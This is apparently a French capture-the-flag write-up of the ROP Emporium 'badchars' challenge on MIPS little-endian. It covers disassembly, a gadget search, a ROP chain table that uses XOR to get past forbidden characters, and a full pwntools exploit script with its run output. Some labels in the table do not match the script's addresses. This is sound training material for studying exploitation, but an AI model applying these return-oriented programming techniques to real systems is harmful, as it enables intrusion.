---
Title: Ropemporium mipsel badchars
Date: 2023-07-05
Tags: [linux, python, ROP, mipsel, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# badchars mipsel

## Introduction.

Le pitch de cet exercie se trouve sur cette page :

[badchars](https://ropemporium.com/challenge/badchars.html)

Le programme est semblable au précédent, write4 mais certains caractères présent dans le nom de fichier sont interdits


## Découverte

### Contenu du challenge

    -rwxr-xr-x 1 jce jce 7948 10 juil.  2020 badchars_mipsel
    -rw-r--r-- 1 jce jce   33  2 juil.  2020 flag.txt
    -rwxr-xr-x 1 jce jce 7568 10 juil.  2020 libbadchars_mipsel.so

### Première execution

    ./badchars_mipsel
    badchars by ROP Emporium
    MIPS

    badchars are: 'x', 'g', 'a', '.'
    > flag.txt
    Thank you!

En fait, les caractères interdits sont remplacés par une valeur fixe.


## Analyse

### Le programe principal

La fonction main appelle la fonction vulnérable située dans la librairie comme dans write4.

    ┌ 76: int main (int32_t argc);
    │           ; arg int32_t argc @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           0x00400890      e0ffbd27       addiu sp, sp, -0x20
    │           0x00400894      1c00bfaf       sw ra, (var_1ch)
    │           0x00400898      1800beaf       sw fp, (var_18h)
    │           0x0040089c      25f0a003       move fp, sp
    │           0x004008a0      42001c3c       lui gp, 0x42                ; 'B'
    │           0x004008a4      10909c27       addiu gp, gp, -0x6ff0
    │           0x004008a8      1000bcaf       sw gp, (var_10h)
    │           0x004008ac      5080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x411060:4]=0x400a90 sym.imp.pwnme
    │           0x004008b0      25c84000       move t9, v0
    │           0x004008b4      09f82003       jalr t9
    │           0x004008b8      00000000       nop
    │           0x004008bc      1000dc8f       lw gp, (var_10h)
    │           0x004008c0      25100000       move v0, zero
    │           0x004008c4      25e8c003       move sp, fp
    │           0x004008c8      1c00bf8f       lw ra, (var_1ch)
    │           0x004008cc      1800be8f       lw fp, (var_18h)
    │           0x004008d0      2000bd27       addiu sp, sp, 0x20
    │           0x004008d4      0800e003       jr ra
    └           0x004008d8      00000000       nop


La fonction usefulfunction n'est pas utilisée mais appelle la fonction print_file de la librairie la rendant ainsi accessible.

    ┌ 84: sym.usefulFunction (int32_t arg1, int32_t arg_10h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int32_t arg1 @ a0
    │           0x004008dc      e0ffbd27       addiu sp, sp, -0x20
    │           0x004008e0      1c00bfaf       sw ra, (var_1ch)
    │           0x004008e4      1800beaf       sw fp, (var_18h)
    │           0x004008e8      25f0a003       move fp, sp
    │           0x004008ec      42001c3c       lui gp, 0x42                ; 'B'
    │           0x004008f0      10909c27       addiu gp, gp, -0x6ff0
    │           0x004008f4      1000bcaf       sw gp, (var_10h)
    │           0x004008f8      4000023c       lui v0, 0x40                ; '@'
    │           0x004008fc      300b4424       addiu a0, v0, 0xb30         ; 0x400b30 ; "nonexistent" ; arg1 ; str.nonexistent
    │           0x00400900      4080828f       lw v0, -sym.imp.print_file(gp) ; [0x411050:4]=0x400ab0 sym.imp.print_file
    │           0x00400904      25c84000       move t9, v0
    │           0x00400908      09f82003       jalr t9
    │           0x0040090c      00000000       nop
    │           0x00400910      1000dc8f       lw gp, (var_10h)
    │           0x00400914      00000000       nop
    │           0x00400918      25e8c003       move sp, fp
    │           0x0040091c      1c00bf8f       lw ra, (var_1ch)
    │           0x00400920      1800be8f       lw fp, (var_18h)
    │           0x00400924      2000bd27       addiu sp, sp, 0x20
    │           0x00400928      0800e003       jr ra
    └           0x0040092c      00000000       nop


Une référence designe des gadgets embarqués :

            ;-- usefulGadgets:
            0x00400930      0c00b98f       lw t9, 0xc(sp)
            0x00400934      0800a88f       lw t0, 8(sp)
            0x00400938      0400a98f       lw t1, 4(sp)
            0x0040093c      000009ad       sw t1, (t0)
            0x00400940      09f82003       jalr t9
            0x00400944      1000bd23       addi sp, sp, 0x10
            0x00400948      0c00b98f       lw t9, 0xc(sp)
            0x0040094c      0800a88f       lw t0, 8(sp)
            0x00400950      0400a98f       lw t1, 4(sp)
            0x00400954      00002a8d       lw t2, (t1)
            0x00400958      26400a01       xor t0, t0, t2
            0x0040095c      000028ad       sw t0, (t1)
            0x00400960      09f82003       jalr t9
            0x00400964      1000bd23       addi sp, sp, 0x10
            0x00400968      0800a48f       lw a0, 8(sp)
            0x0040096c      0400b98f       lw t9, 4(sp)
            0x00400970      09f82003       jalr t9
            0x00400974      0c00bd23       addi sp, sp, 0xc


### La librairie libbadchars_mipsel.so


La fonction vulnérable effectue la lecture du message et le contrôle / remplacement des caractères interdits : 'x', 'g', 'a', '.'


    ┌ 464: sym.pwnme (int32_t arg1, int32_t arg3, int32_t arg_10h, int32_t arg_18h, int32_t arg_1ch, int32_t arg_20h, int32_t arg_28h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; arg int32_t arg_1ch @ fp+0x1c
    │           ; arg int32_t arg_20h @ fp+0x20
    │           ; arg int32_t arg_28h @ fp+0x28
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; var int32_t var_20h @ sp+0x20
    │           ; var signed int var_28h @ sp+0x28
    │           ; var int32_t var_48h @ sp+0x48
    │           ; var int32_t var_4ch @ sp+0x4c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg3 @ a2
    │           0x00000880      02001c3c       lui gp, 2
    │           0x00000884      70879c27       addiu gp, gp, -0x7890
    │           0x00000888      21e09903       addu gp, gp, t9
    │           0x0000088c      b0ffbd27       addiu sp, sp, -0x50
    │           0x00000890      4c00bfaf       sw ra, (var_4ch)
    │           0x00000894      4800beaf       sw fp, (var_48h)
    │           0x00000898      25f0a003       move fp, sp
    │           0x0000089c      1000bcaf       sw gp, (var_10h)
    │           0x000008a0      4080828f       lw v0, -0x7fc0(gp)          ; [0x11030:4]=0
    │           0x000008a4      0000428c       lw v0, (v0)
    │           0x000008a8      25380000       move a3, zero
    │           0x000008ac      02000624       addiu a2, zero, 2           ; arg3
    │           0x000008b0      25280000       move a1, zero
    │           0x000008b4      25204000       move a0, v0
    │           0x000008b8      4880828f       lw v0, -sym.imp.setvbuf(gp) ; [0x11038:4]=0xc20 sym.imp.setvbuf
    │           0x000008bc      25c84000       move t9, v0
    │           0x000008c0      09f82003       jalr t9
    │           0x000008c4      00000000       nop
    │           0x000008c8      1000dc8f       lw gp, (var_10h)
    │           0x000008cc      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x000008d0      b40c4424       addiu a0, v0, 0xcb4         ; arg1
    │           0x000008d4      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xc00 sym.imp.puts
    │           0x000008d8      25c84000       move t9, v0
    │           0x000008dc      09f82003       jalr t9
    │           0x000008e0      00000000       nop
    │           0x000008e4      1000dc8f       lw gp, (var_10h)
    │           0x000008e8      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x000008ec      d00c4424       addiu a0, v0, str.MIPS_n    ; 0xcd0 ; "MIPS\n" ; arg1
    │           0x000008f0      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xc00 sym.imp.puts
    │           0x000008f4      25c84000       move t9, v0
    │           0x000008f8      09f82003       jalr t9
    │           0x000008fc      00000000       nop
    │           0x00000900      1000dc8f       lw gp, (var_10h)
    │           0x00000904      2800c227       addiu v0, fp, 0x28
    │           0x00000908      20000624       addiu a2, zero, 0x20        ; arg3
    │           0x0000090c      25280000       move a1, zero
    │           0x00000910      25204000       move a0, v0
    │           0x00000914      4480828f       lw v0, -sym.imp.memset(gp)  ; [0x11034:4]=0xc30 sym.imp.memset
    │           0x00000918      25c84000       move t9, v0
    │           0x0000091c      09f82003       jalr t9
    │           0x00000920      00000000       nop
    │           0x00000924      1000dc8f       lw gp, (var_10h)
    │           0x00000928      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x0000092c      d80c4424       addiu a0, v0, str.badchars_are:_x__g__a__. ; 0xcd8 ; "badchars are: 'x', 'g', 'a', '.'" ; arg1
    │           0x00000930      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xc00 sym.imp.puts
    │           0x00000934      25c84000       move t9, v0
    │           0x00000938      09f82003       jalr t9
    │           0x0000093c      00000000       nop
    │           0x00000940      1000dc8f       lw gp, (var_10h)
    │           0x00000944      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x00000948      fc0c4424       addiu a0, v0, 0xcfc         ; arg1
    │           0x0000094c      6480828f       lw v0, -sym.imp.printf(gp)  ; [0x11054:4]=0xbd0 sym.imp.printf
    │           0x00000950      25c84000       move t9, v0
    │           0x00000954      09f82003       jalr t9
    │           0x00000958      00000000       nop
    │           0x0000095c      1000dc8f       lw gp, (var_10h)
    │           0x00000960      2800c227       addiu v0, fp, 0x28
    │           0x00000964      00020624       addiu a2, zero, 0x200       ; arg3
    │           0x00000968      25284000       move a1, v0
    │           0x0000096c      25200000       move a0, zero
    │           0x00000970      6c80828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x1105c:4]=0xbc0 sym.imp.read
    │           0x00000974      25c84000       move t9, v0
    │           0x00000978      09f82003       jalr t9
    │           0x0000097c      00000000       nop
    │           0x00000980      1000dc8f       lw gp, (var_10h)
    │           0x00000984      1800c2af       sw v0, (var_18h)
    │           0x00000988      1c00c0af       sw zero, (var_1ch)
    │       ┌─< 0x0000098c      1d000010       b 0xa04
    │       │   0x00000990      00000000       nop
    │       │   ; CODE XREF from sym.pwnme @ 0xa10
    │      ┌──> 0x00000994      2000c0af       sw zero, (var_20h)
    │     ┌───< 0x00000998      13000010       b 0x9e8
    │     │╎│   0x0000099c      00000000       nop
    │     │╎│   ; CODE XREF from sym.pwnme @ 0x9f0
    │    ┌────> 0x000009a0      1c00c28f       lw v0, (var_1ch)
    │    ╎│╎│   0x000009a4      1800c327       addiu v1, fp, 0x18
    │    ╎│╎│   0x000009a8      21106200       addu v0, v1, v0
    │    ╎│╎│   0x000009ac      10004380       lb v1, (var_28h)
    │    ╎│╎│   0x000009b0      2000c28f       lw v0, (var_20h)
    │    ╎│╎│   0x000009b4      5880848f       lw a0, -obj.badcharacters(gp) ; [0x11048:4]=0xcb0 sym..rodata
    │    ╎│╎│   0x000009b8      21108200       addu v0, a0, v0             ; arg1
    │    ╎│╎│   0x000009bc      00004280       lb v0, (v0)                 ; [0xcb0:1]=120 ; "xga.badchars by ROP Emporium"
    │   ┌─────< 0x000009c0      06006214       bne v1, v0, 0x9dc
    │   │╎│╎│   0x000009c4      00000000       nop
    │   │╎│╎│   0x000009c8      1c00c28f       lw v0, (var_1ch)
    │   │╎│╎│   0x000009cc      1800c327       addiu v1, fp, 0x18
    │   │╎│╎│   0x000009d0      21106200       addu v0, v1, v0
    │   │╎│╎│   0x000009d4      ebff0324       addiu v1, zero, -0x15
    │   │╎│╎│   0x000009d8      100043a0       sb v1, (var_28h)
    │   │╎│╎│   ; CODE XREF from sym.pwnme @ 0x9c0
    │   └─────> 0x000009dc      2000c28f       lw v0, (var_20h)
    │    ╎│╎│   0x000009e0      01004224       addiu v0, v0, 1
    │    ╎│╎│   0x000009e4      2000c2af       sw v0, (var_20h)
    │    ╎│╎│   ; CODE XREF from sym.pwnme @ 0x998
    │    ╎└───> 0x000009e8      2000c28f       lw v0, (var_20h)
    │    ╎ ╎│   0x000009ec      0400422c       sltiu v0, v0, 4
    │    └────< 0x000009f0      ebff4014       bnez v0, 0x9a0
    │      ╎│   0x000009f4      00000000       nop
    │      ╎│   0x000009f8      1c00c28f       lw v0, (var_1ch)
    │      ╎│   0x000009fc      01004224       addiu v0, v0, 1
    │      ╎│   0x00000a00      1c00c2af       sw v0, (var_1ch)
    │      ╎│   ; CODE XREF from sym.pwnme @ 0x98c
    │      ╎└─> 0x00000a04      1c00c38f       lw v1, (var_1ch)
    │      ╎    0x00000a08      1800c28f       lw v0, (var_18h)
    │      ╎    0x00000a0c      2b106200       sltu v0, v1, v0
    │      └──< 0x00000a10      e0ff4014       bnez v0, 0x994
    │           0x00000a14      00000000       nop
    │           0x00000a18      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x00000a1c      000d4424       addiu a0, v0, str.Thank_you_ ; 0xd00 ; "Thank you!" ; arg1
    │           0x00000a20      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xc00 sym.imp.puts
    │           0x00000a24      25c84000       move t9, v0
    │           0x00000a28      09f82003       jalr t9
    │           0x00000a2c      00000000       nop
    │           0x00000a30      1000dc8f       lw gp, (var_10h)
    │           0x00000a34      00000000       nop
    │           0x00000a38      25e8c003       move sp, fp
    │           0x00000a3c      4c00bf8f       lw ra, (var_4ch)
    │           0x00000a40      4800be8f       lw fp, (var_48h)
    │           0x00000a44      5000bd27       addiu sp, sp, 0x50
    │           0x00000a48      0800e003       jr ra
    └           0x00000a4c      00000000       nop


La lecture est réalisée comme dans write 4

        │           0x0000095c      1000dc8f       lw gp, (var_10h)
        │           0x00000960      2800c227       addiu v0, fp, 0x28
        │           0x00000964      00020624       addiu a2, zero, 0x200       ; arg3
        │           0x00000968      25284000       move a1, v0
        │           0x0000096c      25200000       move a0, zero
        │           0x00000970      6c80828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x1105c:4]=0xbc0 sym.imp.read

L'offset de débordement est le même que pour write4 0x24 ( 0x50 - 0x28 ).
La taille de lecture de 512 est assez conséquente.

## Constuction de l'attaque

### Le plan

On va d'abord ecrire une flag.txt avec les caractères interdits modifié par une xor.

Ce qui nous donne avec un xor 3 : 'flbd-t{t'.

Puis xorer de nouveau chaque caractère en mémoire pour obtenir la valeur initiale.

Pour la première partie envisage de procéder comme pour write4

### Recherche de gadgets

Pour l'ecriture en memoire.

On recherche un gadget de type "store word"

    # ROPgadget --binary badchars_mipsel --depth 6| grep "sw"
    0x004008a4 : addiu $gp, $gp, -0x6ff0 ; sw $gp, 0x10($sp) ; lw $v0, -0x7fb0($gp) ; move $t9, $v0 ; jalr $t9 ; nop
    0x00400a54 : addiu $s0, $v1, 0xff0 ; sw $ra, 0x24($sp) ; jalr $t9 ; addiu $s0, $s0, -4
    0x00400a4c : addiu $s1, $zero, -1 ; sw $s0, 0x1c($sp) ; addiu $s0, $v1, 0xff0 ; sw $ra, 0x24($sp) ; jalr $t9 ; addiu $s0, $s0, -4
    0x0040082c : addiu $v0, $v0, 1 ; sll $v1, $v0, 2 ; sw $v0, 0x1074($s1) ; addu $v0, $s2, $v1 ; lw $t9, ($v0) ; jalr $t9 ; nop
    0x004008a0 : lui $gp, 0x42 ; addiu $gp, $gp, -0x6ff0 ; sw $gp, 0x10($sp) ; lw $v0, -0x7fb0($gp) ; move $t9, $v0 ; jalr $t9 ; nop
    0x00400724 : lw $t0, -0x7fe0($gp) ; sw $t0, 0x10($sp) ; sw $v0, 0x14($sp) ; sw $sp, 0x18($sp) ; lw $t9, -0x7fbc($gp) ; jalr $t9 ; nop
    0x0040094c : lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x00400934 : lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x00400950 : lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x00400938 : lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x00400954 : lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x00400930 : lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x0040092c : nop ; lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x00400830 : sll $v1, $v0, 2 ; sw $v0, 0x1074($s1) ; addu $v0, $s2, $v1 ; lw $t9, ($v0) ; jalr $t9 ; nop
    0x004008f4 : sw $gp, 0x10($sp) ; lui $v0, 0x40 ; addiu $a0, $v0, 0xb30 ; lw $v0, -0x7fc0($gp) ; move $t9, $v0 ; jalr $t9 ; nop
    0x004008a8 : sw $gp, 0x10($sp) ; lw $v0, -0x7fb0($gp) ; move $t9, $v0 ; jalr $t9 ; nop
    0x00400688 : sw $ra, 0x1c($sp) ; lw $v0, -0x7fb8($gp) ; beqz $v0, 0x4006a4 ; nop ; lw $t9, -0x7fb8($gp) ; jalr $t9 ; nop
    0x00400a58 : sw $ra, 0x24($sp) ; jalr $t9 ; addiu $s0, $s0, -4
    0x00400a50 : sw $s0, 0x1c($sp) ; addiu $s0, $v1, 0xff0 ; sw $ra, 0x24($sp) ; jalr $t9 ; addiu $s0, $s0, -4
    0x00400a48 : sw $s1, 0x20($sp) ; addiu $s1, $zero, -1 ; sw $s0, 0x1c($sp) ; addiu $s0, $v1, 0xff0 ; sw $ra, 0x24($sp) ; jalr $t9 ; addiu $s0, $s0, -4
    0x00400730 : sw $sp, 0x18($sp) ; lw $t9, -0x7fbc($gp) ; jalr $t9 ; nop
    0x0040095c : sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x0040095c : sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10 ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc
    0x00400728 : sw $t0, 0x10($sp) ; sw $v0, 0x14($sp) ; sw $sp, 0x18($sp) ; lw $t9, -0x7fbc($gp) ; jalr $t9 ; nop
    0x0040093c : sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
    0x00400834 : sw $v0, 0x1074($s1) ; addu $v0, $s2, $v1 ; lw $t9, ($v0) ; jalr $t9 ; nop
    0x0040072c : sw $v0, 0x14($sp) ; sw $sp, 0x18($sp) ; lw $t9, -0x7fbc($gp) ; jalr $t9 ; nop
    0x00400958 : xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10

La plus intéressant est le suivant qui permet le chargement des registres et l'ecriture en memoire :

    0x00400930 : lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10



Recherche d'un gadget effectuant un xor.

On trouve.

    0x00400948 : lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10

- lw t9, 0xc(sp)  Charge t9 en vue du jump à la fin
- lw t0, 8(sp)    Charge t0 depuis la pile pour le xor
- lw t1, 4(sp)    Charge t1 avec une adresse du la pile
- lw t2, (t1)     Charge dans t2 le contenur de cette adrress
- xor t0, t0, t2  Effectue le xor entre les deux
- sw t0, (t1)     Sauve le resultat a la même adresse
- jalr t9         Appelle l'adress chagée dans t9 au départ
- addi sp, sp, 0x10 Fixe la valeur de la pile.


Pour appeller la fonction avec un argument.

    # ROPgadget --binary badchars_mipsel --depth 4| grep "lw \$a0"
    0x00400964 : addi $sp, $sp, 0x10 ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc
    0x00400968 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc

On retient 0x00400968.

- lw a0, 8(sp)          Charge a0 avec l'adresse en argument
- lw t9, 4(sp)          Charge l'adresse cible
- jalr t9               Effecue l'appel
- addi sp, sp, 0xc      Ajuste la pile au moment du call.

### La chaine de ROP.


| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| ---------- | Ecriture de "flbd" dans .bss|
| 0x00400930 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10 |
| 0xdeadbeef | | junk |
| 0x67626c66 | 'flbd' | pour `t1
| 0x00001070 | @.bss | pour `t0`
| 0x00400930 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10  | Pour `t9` en vue d'ecrire la seconde partie
| ---------- | Ecriture de "-t{t"" dans .bss+4
| 0xdeadbeef | | junk |
| 0x747b742d | '-t{t' | pour `t1`
| 0x00001074 | @.bss+4 | pour `t0`
| 0x00400948 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10 | Pour `t9`
| ---------- | Sequence de xor
|---------- | bss[2]=bss[2]^3
| 0xdeadbeef | | junk |
| 0x00001072 | @.bss+2 | pour `t1`
| 3 | 3 | pour `t0`
| 0x00400948 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10 | Pour `t9`
| ---------- | bss[3]=bss[3]^3
| 0xdeadbeef | | junk |
| 0x00001072 | @.bss+2 | pour `t1`
| 3 | 3 | pour `t0`
| 0x00400948 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10 | Pour `t9`
| ----------| bss[4]=bss[4]^3| -----
| 0xdeadbeef | | junk |
| 0x00001074 | @.bss+2 | pour `t1`
| 3 | 3 | pour `t0`
| 0x00400948 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10 | Pour `t9`
| ----------| bss[6]=bss[6]^3
| 0xdeadbeef | | junk |
| 0x00001076 | @.bss+2 | pour `t1`
| 3 | 3 | pour `t0`
| 0x00400968 | lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop | Pour `t9` gadget de call
| ----------| ----------| Appel print_file(@.bss)
| 0xdeadbeef | | junk |
| 0x00400a90 | print_file@plt | pour `t9`
| 0x00001064 | @.bss | pour `a0`

## Exploitation

### Script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


# ROPemporium badchars MIPSEL

# Set up pwntools for the correct architecture
elf = context.binary = ELF('badchars_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+444
c
'''

def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Gadgets
# lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
g_write = 0x00400930

# lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10
g_xor = 0x00400948

# lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc
g_set_a0_and_call = 0x00400968

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


print_file = elf.plt["print_file"]
bssaddr = elf.get_section_by_name('.bss').header['sh_addr']

log.info(f"{bssaddr=:x}")
log.info(f"{print_file=:x}")



offset=0x24
flagxored = xorchain(b"flag.txt",0b00111010,3)

PL=b"A"*offset
# first gadget write "flbd"
PL+=p32(g_write)
PL+=p32(0xdeadbeef)        # junk
PL+=flagxored[:4]          # t1
PL+=p32(bssaddr)           # t0
PL+=p32(g_write)           # t9 => next gadget

# Secon gadget write "-t{t"
PL+=p32(0xf00df00d) 	   # junk
PL+=flagxored[4:8]         # t1
PL+=p32(bssaddr+4)         # t0

# xor each modified char
# 2 3 4 6
for idx in [2,3,4,6]:
    PL+=p32(g_xor)          # t9 => next gadget pop by prior gadget
    PL+=p32(0xdeadbeef)     # junk
    PL+=p32(bssaddr+idx)    # t1
    PL+=p32(3)              # t0

PL+=p32(g_set_a0_and_call)  # t9 => next gadget for prior
PL+=p32(0xaaaaaaaa)         # junk for addi $sp, $sp, 0x10

# call print_file(@.bss)
PL+=p32(print_file)        # t9
PL+=p32(bssaddr)           # a0

log.info(f"Payload size : 0x{len(PL):x}")
log.info(PL.hex())
io.sendlineafter(b"> ",PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()
```

### Déroulement du script

    python3 solve.py
    [*] '/home/jce/w/ropemporium/mipsel/05_badchars/badchars_mipsel'
        Arch:     mips-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [+] Starting local process '/home/jce/w/ropemporium/mipsel/05_badchars/badchars_mipsel': pid 24063
    [*] bssaddr=411070
    [*] print_file=400aac
    [*] Payload size : 0x94
    [*] 41414141414141414141414141414141414141414141414141414141414141414141414130094000efbeadde666c626470104100300940000df00df02d747b747410410048094000efbeadde721041000300000048094000efbeadde731041000300000048094000efbeadde741041000300000048094000efbeadde761041000300000068094000aaaaaaaaac0a400070104100
    [+] flag : ROPE{a_placeholder_32byte_flag!}


